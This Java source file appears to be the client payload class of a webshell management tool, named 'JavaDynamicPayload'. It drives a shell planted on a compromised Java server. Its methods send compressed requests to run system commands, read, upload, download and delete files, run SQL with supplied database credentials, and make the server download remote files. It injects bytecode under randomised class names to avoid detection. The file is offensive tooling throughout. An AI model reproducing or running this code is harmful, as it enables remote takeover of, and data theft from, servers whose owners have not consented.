package shells.payloads.java;

import core.EasyI18N;
import core.Encoding;
import core.annotation.PayloadAnnotation;
import core.imp.Payload;
import core.shell.ShellEntity;
import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import javassist.ClassPool;
import javassist.CtClass;
import util.Log;
import util.functions;
import util.http.Http;
import util.http.ReqParameter;

@PayloadAnnotation(Name = "JavaDynamicPayload")
public class JavaShell
  implements Payload {
  private static final String BASICINFO_REGEX = "(FileRoot|CurrentDir|OsInfo|CurrentUser|ProcessArch|TempDirectory) : (.+)";
  private static final String[] ALL_DATABASE_TYPE = new String[] { "mysql", "oracle", "sqlserver", "postgresql", "sqlite" };
  private ShellEntity shell;
  private Http http;
  private Encoding encoding;
  private String fileRoot;
  private String currentDir;
  private String currentUser;
  private String osInfo;
  private String basicsInfo;
  private String processArch;
  private String tempDirectory;
  private HashSet dynamicClassNameSet = null;
  private HashMap<String, String> dynamicClassNameHashMap = null;
  private boolean isAlive;
  
  public JavaShell() {
    this.dynamicClassNameSet = DynamicUpdateClass.getAllDynamicClassName();
    this.dynamicClassNameHashMap = new HashMap<>();
  }


  
  public void init(ShellEntity shellContext) {
    this.shell = shellContext;
    this.http = this.shell.getHttp();
    this.encoding = Encoding.getEncoding(this.shell);
  }
  public String getClassName(String protoName) {
    return this.dynamicClassNameHashMap.get(protoName);
  }
  public synchronized String randomName() {
    String[] classNames = (String[])this.dynamicClassNameSet.toArray((Object[])new String[0]);
    String className = null;
    if (classNames.length > 0) {
      int index = functions.randomInt(0, classNames.length);
      className = classNames[index];
      this.dynamicClassNameSet.remove(className);
    } 
    return className;
  }
  public byte[] dynamicUpdateClassName(String protoName, byte[] classContent) {
    try {
      CtClass ctClass = ClassPool.getDefault().makeClass(new ByteArrayInputStream(classContent));
      String className = randomName();
      ctClass.setName(className);
      this.dynamicClassNameHashMap.put(protoName, className);
      Log.log("%s ----->>>>> %s", new Object[] { protoName, className });
      classContent = ctClass.toBytecode();
      ctClass.detach();
      return classContent;
    } catch (Exception e) {
      Log.error(e);
      
      this.dynamicClassNameHashMap.put(protoName, protoName);
      return classContent;
    } 
  }
  
  public String getFile(String filePath) {
    ReqParameter parameters = new ReqParameter();
    parameters.add("dirName", this.encoding.Encoding((filePath.length() > 0) ? filePath : " "));
    return this.encoding.Decoding(evalFunc(null, "getFile", parameters));
  }

  
  public byte[] downloadFile(String fileName) {
    ReqParameter parameter = new ReqParameter();
    parameter.add("fileName", this.encoding.Encoding(fileName));
    byte[] result = evalFunc(null, "readFile", parameter);
    return result;
  }

  
  public String getBasicsInfo() {
    if (this.basicsInfo == null) {
      ReqParameter parameter = new ReqParameter();
      this.basicsInfo = this.encoding.Decoding(evalFunc(null, "getBasicsInfo", parameter));
    } 
    Map<String, String> pxMap = functions.matcherTwoChild(this.basicsInfo, "(FileRoot|CurrentDir|OsInfo|CurrentUser|ProcessArch|TempDirectory) : (.+)");
    this.fileRoot = pxMap.get("FileRoot");
    this.currentDir = pxMap.get("CurrentDir");
    this.currentUser = pxMap.get("CurrentUser");
    this.osInfo = pxMap.get("OsInfo");
    this.processArch = pxMap.get("ProcessArch");
    this.tempDirectory = pxMap.get("TempDirectory");
    return this.basicsInfo;
  }

  
  public boolean include(String codeName, byte[] binCode) {
    ReqParameter parameters = new ReqParameter();
    binCode = dynamicUpdateClassName(codeName, binCode);
    codeName = this.dynamicClassNameHashMap.get(codeName);
    if (codeName != null) {
      parameters.add("codeName", codeName);
      parameters.add("binCode", binCode);
      byte[] result = evalFunc(null, "include", parameters);
      String resultString = (new String(result)).trim();
      if (resultString.equals("ok")) {
        return true;
      }
      Log.error(resultString);
      return false;
    } 
    
    Log.error(String.format(EasyI18N.getI18nString("类: %s 映射不存在"), new Object[] { codeName }));
    
    return false;
  }

  
  public void fillParameter(String className, String funcName, ReqParameter parameter) {
    if (className != null && className.trim().length() > 0) {
      parameter.add("evalClassName", getClassName(className));
    }
    parameter.add("methodName", funcName);
  }


  
  public byte[] evalFunc(String className, String funcName, ReqParameter parameter) {
    fillParameter(className, funcName, parameter);
    byte[] data = parameter.formatEx();
    
    data = functions.gzipE(data);

    
    return functions.gzipD(this.http.sendHttpResponse(data).getResult());
  }


  
  public boolean uploadFile(String fileName, byte[] data) {
    ReqParameter parameter = new ReqParameter();
    parameter.add("fileName", this.encoding.Encoding(fileName));
    parameter.add("fileValue", data);
    byte[] result = evalFunc(null, "uploadFile", parameter);
    String stateString = this.encoding.Decoding(result);
    if ("ok".equals(stateString)) {
      return true;
    }
    Log.error(stateString);
    return false;
  }


  
  public boolean copyFile(String fileName, String newFile) {
    ReqParameter parameter = new ReqParameter();
    parameter.add("srcFileName", this.encoding.Encoding(fileName));
    parameter.add("destFileName", this.encoding.Encoding(newFile));
    byte[] result = evalFunc(null, "copyFile", parameter);
    String stateString = this.encoding.Decoding(result);
    if ("ok".equals(stateString)) {
      return true;
    }
    Log.error(stateString);
    return false;
  }


  
  public boolean deleteFile(String fileName) {
    ReqParameter parameter = new ReqParameter();
    parameter.add("fileName", this.encoding.Encoding(fileName));
    byte[] result = evalFunc(null, "deleteFile", parameter);
    String stateString = this.encoding.Decoding(result);
    if ("ok".equals(stateString)) {
      return true;
    }
    Log.error(stateString);
    return false;
  }

  
  public boolean newFile(String fileName) {
    ReqParameter parameter = new ReqParameter();
    parameter.add("fileName", this.encoding.Encoding(fileName));
    byte[] result = evalFunc(null, "newFile", parameter);
    String stateString = this.encoding.Decoding(result);
    if ("ok".equals(stateString)) {
      return true;
    }
    Log.error(stateString);
    return false;
  }


  
  public boolean newDir(String fileName) {
    ReqParameter parameter = new ReqParameter();
    parameter.add("dirName", this.encoding.Encoding(fileName));
    byte[] result = evalFunc(null, "newDir", parameter);
    String stateString = this.encoding.Decoding(result);
    if ("ok".equals(stateString)) {
      return true;
    }
    Log.error(stateString);
    return false;
  }



  
  public String execSql(String dbType, String dbHost, int dbPort, String dbUsername, String dbPassword, String execType, Map options, String execSql) {
    ReqParameter parameter = new ReqParameter();
    parameter.add("dbType", dbType);
    parameter.add("dbHost", dbHost);
    parameter.add("dbPort", Integer.toString(dbPort));
    parameter.add("dbUsername", dbUsername);
    parameter.add("dbPassword", dbPassword);
    parameter.add("execType", execType);
    parameter.add("execSql", this.shell.getDbEncodingModule().Encoding(execSql));
    if (options != null) {
      String dbCharset = (String)options.get("dbCharset");
      String currentDb = (String)options.get("currentDb");
      if (dbCharset != null) {
        parameter.add("dbCharset", dbCharset);
        parameter.add("execSql", Encoding.getEncoding(dbCharset).Encoding(execSql));
      } 
      if (currentDb != null) {
        parameter.add("currentDb", currentDb);
      }
    } 
    byte[] result = evalFunc(null, "execSql", parameter);
    return this.encoding.Decoding(result);
  }

  
  public String currentDir() {
    if (this.currentDir != null) {
      return functions.formatDir(this.currentDir);
    }
    getBasicsInfo();
    return functions.formatDir(this.currentDir);
  }


  
  public boolean test() {
    ReqParameter parameter = new ReqParameter();
    byte[] result = evalFunc(null, "test", parameter);
    String codeString = new String(result);
    if (codeString.trim().equals("ok")) {
      this.isAlive = true;
      return true;
    } 
    Log.error(codeString);
    return false;
  }


  
  public String currentUserName() {
    if (this.currentUser != null) {
      return this.currentUser;
    }
    getBasicsInfo();
    return this.currentUser;
  }


  
  public String bigFileUpload(String fileName, int position, byte[] content) {
    ReqParameter reqParameter = new ReqParameter();
    reqParameter.add("fileContents", content);
    reqParameter.add("fileName", this.encoding.Encoding(fileName));
    reqParameter.add("position", String.valueOf(position));
    byte[] result = evalFunc(null, "bigFileUpload", reqParameter);
    return this.encoding.Decoding(result);
  }

  
  public String getTempDirectory() {
    if (this.tempDirectory != null) {
      return this.tempDirectory;
    }
    if (isWindows()) {
      return "c:/windows/temp/";
    }
    return "/tmp/";
  }



  
  public byte[] bigFileDownload(String fileName, int position, int readByteNum) {
    ReqParameter reqParameter = new ReqParameter();
    reqParameter.add("position", String.valueOf(position));
    reqParameter.add("readByteNum", String.valueOf(readByteNum));
    reqParameter.add("fileName", this.encoding.Encoding(fileName));
    reqParameter.add("mode", "read");
    return evalFunc(null, "bigFileDownload", reqParameter);
  }

  
  public int getFileSize(String fileName) {
    ReqParameter reqParameter = new ReqParameter();
    reqParameter.add("fileName", this.encoding.Encoding(fileName));
    reqParameter.add("mode", "fileSize");
    byte[] result = evalFunc(null, "bigFileDownload", reqParameter);
    String ret = this.encoding.Decoding(result);
    try {
      return Integer.parseInt(ret);
    } catch (Exception e) {
      Log.error(e);
      Log.error(ret);
      
      return -1;
    } 
  }
  
  public boolean isWindows() {
    return (currentDir().charAt(0) != '/');
  }

  
  public boolean isAlive() {
    return this.isAlive;
  }

  
  public boolean isX64() {
    return this.processArch.contains("64");
  }

  
  public String[] listFileRoot() {
    if (this.fileRoot != null) {
      return this.fileRoot.split(";");
    }
    getBasicsInfo();
    return this.fileRoot.split(";");
  }


  
  public String execCommand(String commandStr) {
    ReqParameter parameter = new ReqParameter();
    parameter.add("cmdLine", this.encoding.Encoding(commandStr));
    
    String[] commandArgs = functions.SplitArgs(commandStr);
    for (int i = 0; i < commandArgs.length; i++) {
      parameter.add(String.format("arg-%d", new Object[] { Integer.valueOf(i) }), this.encoding.Encoding(commandArgs[i]));
    } 
    parameter.add("argsCount", String.valueOf(commandArgs.length));
    
    String[] executableArgs = functions.SplitArgs(commandStr, 1, false);
    
    if (executableArgs.length > 0) {
      parameter.add("executableFile", executableArgs[0]);
      if (executableArgs.length >= 2) {
        parameter.add("executableArgs", executableArgs[1]);
      }
    } 
    
    byte[] result = evalFunc(null, "execCommand", parameter);
    return this.encoding.Decoding(result);
  }


  
  public String getOsInfo() {
    if (this.osInfo != null) {
      return this.osInfo;
    }
    getBasicsInfo();
    return this.osInfo;
  }



  
  public String[] getAllDatabaseType() {
    return ALL_DATABASE_TYPE;
  }

  
  public boolean moveFile(String fileName, String newFile) {
    ReqParameter parameter = new ReqParameter();
    parameter.add("srcFileName", this.encoding.Encoding(fileName));
    parameter.add("destFileName", this.encoding.Encoding(newFile));
    byte[] result = evalFunc(null, "moveFile", parameter);
    String stasteString = this.encoding.Decoding(result);
    if ("ok".equals(stasteString)) {
      return true;
    }
    Log.error(stasteString);
    return false;
  }



  
  public byte[] getPayload() {
    byte[] data = null;
    try {
      InputStream fileInputStream = JavaShell.class.getResourceAsStream("assets/payload.classs");
      data = functions.readInputStream(fileInputStream);
      fileInputStream.close();
    } catch (Exception e) {
      Log.error(e);
    } 
    return dynamicUpdateClassName("payload", data);
  }

  
  public boolean fileRemoteDown(String url, String saveFile) {
    ReqParameter reqParameter = new ReqParameter();
    reqParameter.add("url", this.encoding.Encoding(url));
    reqParameter.add("saveFile", this.encoding.Encoding(saveFile));
    String result = this.encoding.Decoding(evalFunc(null, "fileRemoteDown", reqParameter));
    if ("ok".equals(result)) {
      return true;
    }
    Log.error(result);
    return false;
  }


  
  public boolean setFileAttr(String file, String type, String fileAttr) {
    ReqParameter reqParameter = new ReqParameter();
    reqParameter.add("type", type);
    reqParameter.add("fileName", this.encoding.Encoding(file));
    reqParameter.add("attr", fileAttr);
    String result = this.encoding.Decoding(evalFunc(null, "setFileAttr", reqParameter));
    if ("ok".equals(result)) {
      return true;
    }
    Log.error(result);
    return false;
  }


  
  public boolean close() {
    this.isAlive = false;
    ReqParameter reqParameter = new ReqParameter();
    String result = this.encoding.Decoding(evalFunc(null, "close", reqParameter));
    if ("ok".equals(result)) {
      return true;
    }
    Log.error(result);
    return false;
  }
}
